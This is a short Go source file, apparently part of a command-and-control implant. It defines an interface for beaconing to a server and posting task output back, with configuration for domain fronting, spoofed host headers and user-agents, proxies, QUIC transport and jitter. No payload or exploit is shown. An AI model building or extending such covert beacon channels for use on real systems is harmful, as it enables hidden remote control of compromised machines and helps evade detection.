package bark

import "net/http"

type Barker interface {
	beaconOut(string) ([]byte, error)
	postOutput(string, []byte) ([]byte, error)
}

var (
	Barkers = make(map[string]Barker)
)

type BarkConfig struct {
	//addr
	BarkHost string

	//Host Header and user-agent (for domain fronting)
	DF bool
	Hh string
	Ua string

	Proxyurl  string
	Proxyuser string
	Proxy     bool

	//transport
	QUIC bool
	Jit  float64
	tr   http.RoundTripper
}

// Beacon out over the current valid protocol.
func Beacon(name string, url string) ([]byte, error) {
	var body []byte
	var err error

	body, err = Barkers[name].beaconOut(url)
	return body, err

}

// send output over the current valid protocol.
func PostOut(name string, url string, taskdata []byte) ([]byte, error) {

	var err error

	body, err := Barkers[name].postOutput(url, taskdata)
	return body, err

}
